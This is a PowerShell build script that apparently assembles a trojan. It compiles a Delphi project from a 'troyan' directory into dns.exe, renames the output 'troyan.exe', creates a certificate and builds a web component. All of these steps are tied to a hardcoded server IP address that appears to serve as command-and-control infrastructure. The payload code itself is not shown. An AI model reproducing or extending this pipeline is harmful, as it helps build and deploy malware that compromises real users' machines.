param (
    [string]$serverName
)
$serverName="213.226.112.110"
if ([string]::IsNullOrEmpty($serverName)) {
        throw "-serverName argument is null"
}

$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location -Path $scriptDir
. .\current.ps1 -serverName $serverName
$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
$troyanDir = Resolve-Path -Path (Join-Path -Path $scriptDir -ChildPath "/troyan/troyandelphi")

Write-Host "scriptDir: $scriptDir"
Write-Host "dataDir: $dataDir"
Write-Host "scriptDir: $scriptDir"
Write-Host "certDir: $certDir"


#cert
& (Join-Path -Path $scriptDir -ChildPath "./compile.cert.ps1") -serverName $serverName

#clean
$extensions = @(".dcu", ".res", ".exe",".~pas","*.~dpr")
foreach ($ext in $extensions) {
    Get-ChildItem -Path $troyanDir -Filter "*$ext" | Remove-Item -Force
}
Get-ChildItem -Path $troyanDir -Filter "_*" | Remove-Item -Force
$readyScript=Join-Path -Path $troyanDir -ChildPath "_ready.ps1"
if (Test-Path -Path $readyScript) {
    Remove-Item -Path $readyScript
}

#precompile
& (Join-Path -Path $troyanDir -ChildPath "./precompile.ps1") -serverName $serverName

#compile
$dprFile = Join-Path -Path $troyanDir -ChildPath "dns.dpr"
Set-Location -Path (Split-Path -Path $dprFile -Parent)
& "C:\Program Files (x86)\Borland\Delphi7\Bin\dcc32.exe" "$dprFile"
$exeFile = Join-Path -Path $troyanDir -ChildPath "dns.exe"
$currentExeFile = Join-Path -Path $dataDir -ChildPath "troyan.exe"
Copy-Item -Path $exeFile -Destination $currentExeFile -Force


#web
Set-Location -Path $scriptDir
& (Join-Path -Path $scriptDir -ChildPath "./compile.web.ps1") -serverName $serverName



Write-Host "Compile complete"